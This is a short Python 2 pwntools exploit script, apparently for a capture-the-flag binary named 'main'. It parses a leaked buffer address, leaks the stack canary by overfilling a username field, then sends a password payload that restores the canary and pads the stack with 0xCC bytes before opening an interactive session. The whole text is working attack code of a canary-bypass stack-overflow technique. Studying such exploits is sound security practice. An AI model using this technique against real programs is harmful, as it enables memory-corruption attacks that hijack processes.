#!/usr/bin/env python
# coding:utf-8

import pwn
import binascii

Io = pwn.process("./main")

# read address of buffer
buffer_addr = int(Io.readline()[-13:-1], 16) # [Buffer] -> 0x.....
print hex(buffer_addr)

# input username , leak the canary
print Io.readline() # [Username] : 
Io.send("A" * 8 + "\n") # send to fill the buffer, touch the canary
canary = Io.readline() # read the canary
print binascii.b2a_hex(canary)
canary = pwn.u64(canary[32:40])
print hex(canary)

# input password , stack overflow
print Io.readline()
print Io.readline()

payload = "B" * 8 + pwn.p64(canary) + "\xCC" * (0x30 - 32 - 8)
Io.writeline(payload)


Io.interactive()

